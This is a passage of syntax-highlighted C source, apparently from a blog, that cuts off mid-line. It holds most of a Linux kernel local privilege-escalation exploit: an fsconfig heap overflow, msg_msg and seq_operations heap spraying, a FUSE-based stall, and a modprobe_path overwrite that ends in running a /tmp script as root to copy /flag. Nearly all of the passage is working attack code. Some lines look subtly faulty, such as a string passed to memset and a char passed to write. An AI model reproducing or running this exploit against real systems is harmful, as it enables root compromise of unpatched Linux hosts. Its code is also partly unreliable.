class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUSE_USE_VERSION 34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fuse.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 0x50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEQ_FILE_NUM 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;  <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_mod</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;mkdir -p /tmp&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;cp /flag /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/copy.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xFF\\xFF\\xFF\\xFF&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">uid_t</span> uid, <span class="keyword">gid_t</span> gid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(temp, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(temp);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> exp_fs_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *evil_path = <span class="string">&quot;evil&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">change_next</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fake_msg[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_list.next = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_list.prev = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_type = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_ts = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;next = modprobe_path;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;security = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, fake_msg + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[<span class="number">1</span>], <span class="string">&#x27;A&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_read</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> size, <span class="keyword">off_t</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">              struct fuse_file_info *fi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> evil_buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">char</span> rev;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset &gt;= <span class="number">0x1000</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (offset + size &gt; <span class="number">0x1000</span>)</span><br><span class="line">        size = <span class="number">0x1000</span> - offset;</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(evil_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(evil_buf));</span><br><span class="line">    <span class="built_in">strcpy</span>(evil_buf, <span class="string">&quot;/tmp/shell.sh&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, evil_buf + offset, size);</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;rev, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_getattr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, struct stat *stbuf,</span></span></span><br><span class="line"><span class="params"><span class="function">                 struct fuse_file_info *fi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(stbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct stat));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path, <span class="string">&quot;/&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        stbuf-&gt;st_mode = S_IFDIR | <span class="number">0755</span>;</span><br><span class="line">        stbuf-&gt;st_nlink = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path + <span class="number">1</span>, evil_path) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        stbuf-&gt;st_mode = S_IFREG | <span class="number">0666</span>;</span><br><span class="line">        stbuf-&gt;st_nlink = <span class="number">1</span>;</span><br><span class="line">        stbuf-&gt;st_size = <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        res = -ENOENT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_readdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">void</span> *buf, <span class="keyword">fuse_fill_dir_t</span> filler,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">off_t</span> offset, struct fuse_file_info *fi,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">enum</span> fuse_readdir_flags flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path, <span class="string">&quot;/&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">    filler(buf, <span class="string">&quot;.&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    filler(buf, <span class="string">&quot;..&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    filler(buf, evil_path, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fuse_operations</span> <span class="title">evil_ops</span> =</span> &#123;</span><br><span class="line">    .getattr = evil_getattr,</span><br><span class="line">    .readdir = evil_readdir,</span><br><span class="line">    .read = evil_read,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x20</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr = <span class="number">-1</span>; <span class="comment">// single_start</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *evil_args[] = &#123;<span class="string">&quot;exploit&quot;</span>, <span class="string">&quot;./temp&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    evil_args[<span class="number">0</span>] = argv[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fs_fd[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">char</span> m_ts_buf[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">int</span> seq_fd[SEQ_FILE_NUM];</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    unshare_setup(getuid(), getgid());</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_fd) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to open pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fuse_main(<span class="keyword">sizeof</span>(evil_args) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *) - <span class="number">1</span>, evil_args,</span><br><span class="line">                      &amp;evil_ops, <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;[-] FAILED to create FUSE!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ms_qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ms_qid &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&quot;\x00&quot;</span>, <span class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        ret = msgsnd(ms_qid, &amp;primary_msg, <span class="number">0xfd0</span> - <span class="number">8</span>, MSG_TAG);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ret);</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (msqid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray msg_msg in half of message queues and seq_files...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM / <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&#x27;A&#x27;</span> + i, <span class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        ret = msgsnd(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, MSG_TAG);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ret);</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fs_fd[<span class="number">0</span>] = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd[<span class="number">0</span>] &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to fsopen!&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">        fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;aaaaaaa&quot;</span>, <span class="string">&quot;bbbbbbb&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;0x196082&quot;</span>, <span class="string">&quot;pwned&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = MSG_QUEUE_NUM / <span class="number">2</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&#x27;A&#x27;</span> + i, <span class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, MSG_TAG) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] oob write to overwrite m_ts of one msg_msg...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(m_ts_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(m_ts_buf));</span><br><span class="line">    *((<span class="keyword">long</span> *)m_ts_buf) = <span class="number">0xfd0</span> + <span class="number">0xff0</span>;</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;196082196082196082ya7&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, m_ts_buf, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray more seq_operations...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = MSG_QUEUE_NUM; i &lt; SEQ_FILE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span 